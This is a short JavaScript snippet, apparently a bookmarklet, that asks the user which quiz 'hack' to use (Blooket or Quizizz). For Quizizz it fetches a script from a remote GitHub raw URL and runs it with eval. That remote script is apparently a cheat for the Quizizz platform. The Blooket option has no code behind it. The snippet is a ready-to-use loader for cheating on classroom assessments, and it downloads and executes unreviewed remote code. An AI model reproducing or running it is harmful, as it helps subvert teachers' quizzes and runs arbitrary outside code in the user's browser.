let firstprompt = prompt("Which hack do you want of these?", "Blooket, Quizizz")

if (firstprompt == "Quizizz") {
	javascript:fetch("https://raw.githubusercontent.com/gbaranski/quizizz-cheat/oldmethod/dist/bundle.js").then((res) => res.text().then((t) => eval(t)))
}
